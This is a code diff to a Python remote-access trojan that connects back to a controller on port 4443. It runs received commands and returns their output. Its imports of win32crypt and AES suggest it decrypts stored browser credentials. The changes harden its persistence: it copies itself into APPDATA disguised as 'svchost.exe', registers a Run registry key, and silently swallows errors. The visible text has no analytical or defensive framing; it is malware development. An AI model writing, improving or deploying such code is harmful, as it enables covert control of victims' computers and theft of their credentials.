@@ -8,6 +8,7 @@ import sqlite3
 import base64
 import json
 import win32crypt
+import sys
 from Crypto.Cipher import AES
 
 PORT = 4443
@@ -58,8 +59,12 @@ def get_active_ip():
 def setup_persistence():
     dest = os.path.join(os.getenv("APPDATA"), "svchost.exe")
     if not os.path.exists(dest):
-        shutil.copy2(__file__, dest)
-        os.system(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svchost /t REG_SZ /d "{dest}" /f')
+        try:
+            shutil.copy2(sys.executable, dest)
+            subprocess.run(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svchost /t REG_SZ /d "{dest}" /f', 
+                         shell=True, capture_output=True)
+        except Exception:
+            pass
 
 def connect():
     while True:
@@ -184,7 +189,7 @@ def handle_server(s):
                 output = "[*] No output returned.\n"
             s.sendall(output.encode() + b"__end__")
 
-    except Exception as e:
+    except Exception:
         pass
 
 if __name__ == "__main__":
